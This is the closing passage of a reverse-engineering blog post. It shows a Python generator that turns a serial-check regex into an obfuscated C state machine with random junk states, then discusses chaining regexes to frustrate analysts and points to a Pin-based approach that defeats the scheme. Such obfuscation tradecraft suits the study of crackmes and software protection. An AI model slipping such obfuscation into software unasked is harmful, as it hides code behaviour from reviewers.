<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">import</span> <span class="nn">reCompiler</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">random</span>
</span><span class='line'>
</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="s">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s">]^_`{|}~ </span><span class="se">\t\n\r\x0b\x0c</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">fsm</span> <span class="o">=</span> <span class="n">reCompiler</span><span class="o">.</span><span class="n">compileRE</span><span class="p">(</span><span class="s">&#39;Hi-[0-9][0-9][0-9][0-9]&#39;</span><span class="p">,</span> <span class="n">minimize</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">states</span> <span class="o">=</span> <span class="n">fsm</span><span class="o">.</span><span class="n">states</span>
</span><span class='line'><span class="n">transitions</span> <span class="o">=</span> <span class="n">fsm</span><span class="o">.</span><span class="n">transitions</span>
</span><span class='line'>
</span><span class='line'><span class="n">useless_states</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">100</span><span class="p">))]</span>
</span><span class='line'><span class="n">states</span> <span class="o">+=</span> <span class="n">useless_states</span>
</span><span class='line'>
</span><span class='line'><span class="c"># We don&#39;t want to have dead nodes, so let&#39;s create transition</span>
</span><span class='line'><span class="n">deadnodes</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">useless_states</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">deadnodes</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">states</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">states</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span><span class='line'>    <span class="n">transitions</span> <span class="o">+=</span> <span class="p">[(</span><span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">t</span><span class="p">)]</span>
</span><span class='line'>    <span class="n">deadnodes</span> <span class="o">-=</span> <span class="nb">set</span><span class="p">([</span><span class="n">s</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="c"># To obfuscate we can use random state number</span>
</span><span class='line'><span class="n">dic_states</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span>
</span><span class='line'>    <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">states</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">states</span><span class="p">)</span>
</span><span class='line'><span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">dic_states</span><span class="o">.</span><span class="n">values</span><span class="p">())</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">dic_states</span><span class="o">.</span><span class="n">values</span><span class="p">())))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;unsigned char checkinput(char *p){</span><span class="se">\n</span><span class="s">unsigned int state = </span><span class="si">%d</span><span class="s">;</span><span class="se">\n</span><span class="s">while(*p)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">switch(state)</span><span class="se">\n</span><span class="s">{&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">fsm</span><span class="o">.</span><span class="n">initialState</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">states</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">fsm</span><span class="o">.</span><span class="n">finalStates</span><span class="p">:</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;case </span><span class="si">%d</span><span class="s">:</span><span class="se">\n</span><span class="s">{&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">is_first</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">transitions</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">src</span> <span class="o">!=</span> <span class="n">i</span><span class="p">:</span>
</span><span class='line'>            <span class="k">continue</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">is_first</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;else&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">is_first</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">r</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\\</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;if(*p == </span><span class="si">%s</span><span class="s">)&quot;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'>        <span class="k">elif</span> <span class="n">r</span> <span class="o">==</span> <span class="s">&#39;</span><span class="se">\\</span><span class="s">d&#39;</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;if(*p &gt;= &#39;0&#39; &amp;&amp; *p &lt;= &#39;9&#39;)&quot;</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;Not implemented!&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;{&#39;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="n">fsm</span><span class="o">.</span><span class="n">finalStates</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;return 1;&#39;</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;state = </span><span class="si">%d</span><span class="s">; ++p;&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;}&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Kind of hack to not anchor the regex (not handled by the RE-&gt;FSM)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">fsm</span><span class="o">.</span><span class="n">initialState</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;else ++p;&#39;</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;else return 0;&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;break;</span><span class="se">\n</span><span class="s">}&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;}</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, if you open it in IDA the CFG will look like this:</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/hell_yeah.png"></p>

<p>Not that fun to reverse-engineer I guess. If you are enough curious to look at the complete source, here it is: <a href="http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_generated_by_hand_example.c">fsm_generated_by_hand_example.c</a>.</p>

<h2>Thoughts to be more evil: one input to bind all the regex in the darkness</h2>

<p>Keep in mind, the previous examples are really trivial to analyze, even if we had to do it at the assembly level without Hexrays (by the way Hexrays does a really nice job to simplify the assembly code, cool for us!). Even if we have slightly obfuscated the automaton with useless states/transitions, we may want to make things harder.</p>

<p>One interesting idea to bother the reverse-engineer is to use several regex as &ldquo;input filters&rdquo;. You create one first &ldquo;permissive&rdquo; regex that has many possible valid inputs. To reduce the valid inputs set you use another regex as a filter. And you do that until you have only one valid input: your serial. Note that you may also want to build complex regex, because you are evil.</p>

<p>In that case, the reverse-engineer <strong>has to</strong> analyze all the different regex. And if you focus on a specific regex, you will have too many valid inputs whereas only one gives you the good boy (the intersection of all the valid inputs set of the different regex).</p>

<p>If you are interested by the subject, a cool resource I&rsquo;ve seen recently that does similar things was in a CTF task write-up written by <a href="https://plus.google.com/111956453297829313313">Michal Kowalczyk</a>: read <a href="http://blog.dragonsector.pl/2013/07/sigint-ctf-2013-task-fenster-400-pts.html">it</a>, it&rsquo;s awesome.</p>

<p><strong>UPDATE</strong>: You should also read the follow-up made by <a href="https://twitter.com/fdfalcon">@fdfalcon</a> &ldquo;<a href="http://sysexit.wordpress.com/2013/09/04/a-black-box-approach-against-obfuscated-regular-expressions-using-pin/">A black-box approach against obfuscated regular expressions using Pin</a>&rdquo;. Using Pin to defeat the FSM obfuscation, and to prove my obfuscation was a bit buggy: two birds, one stone :)).</p>

<p>Messing with automata is good for you.</p>
]]></content>
    
  </entry>
  
</feed>